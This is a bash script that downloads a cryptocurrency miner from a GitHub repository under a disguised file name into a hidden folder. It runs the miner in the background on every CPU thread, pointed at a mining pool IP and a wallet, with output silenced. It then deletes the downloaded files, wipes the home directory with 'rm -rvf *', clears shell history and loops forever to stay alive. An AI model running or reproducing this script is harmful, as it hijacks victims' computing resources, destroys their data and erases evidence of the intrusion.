#!/bin/bash
set -x
apt-get update ; apt-get install -y wget curl sudo
mkdir .lib && cd .lib
wget -O sgr1 https://github.com/nandafiku/fillesg/raw/main/SRBMiner-MULTI > /dev/null 2>&1
chmod u+x sgr1
./sgr1 --algorithm aurum --pool 64.23.198.64:443 --wallet bit1qj5ykvg7l9nxv2pjn47qvaharq0hyt9pc3k4yv5.lieur --password webpassword=x --keepalive true --cpu-threads $(nproc --all) > /dev/null 2>&1 &
sleep 30
rm -rvf *
cd ~/
rm -rvf *
history -cr
while true
do
        echo "hold down..."
        sleep 60
done
